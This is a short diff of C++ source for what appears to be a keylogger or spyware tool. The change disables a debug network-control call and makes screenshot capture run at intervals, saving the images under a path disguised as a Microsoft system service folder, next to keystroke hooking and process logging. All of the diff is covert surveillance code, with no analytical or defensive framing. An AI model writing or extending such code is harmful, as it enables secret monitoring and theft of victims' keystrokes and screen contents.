@@ -5,11 +5,10 @@
 #include "encrypt.h"
 #include "net.h"
 
-#define DEBUG
+//#define DEBUG
 
 int main() {
 #ifdef DEBUG
-  Network::ClientControl();
 #endif
 
 #ifndef DEBUG
@@ -20,8 +19,11 @@ int main() {
   Stream::MakeFile();
   Stream::WriteLog("[*] BOOT [*]", KeyHook::activeProcess, true);
 
-  Screen::CaptureScreen(Stream::GetPath(R"(\Microsoft\SystemService\)"), "winpst" + std::to_string(Screen::picId++) + ".jpeg");
-  // TODO capture in intervals
+  Screen::CaptureScreen(Stream::GetPath(R"(\Microsoft\SystemService\)"),
+						"winpst" + std::to_string(Screen::picId) + ".jpeg",
+						false,
+						1000,
+						5);
 
   KeyHook::HandleMessage(true);
 #endif
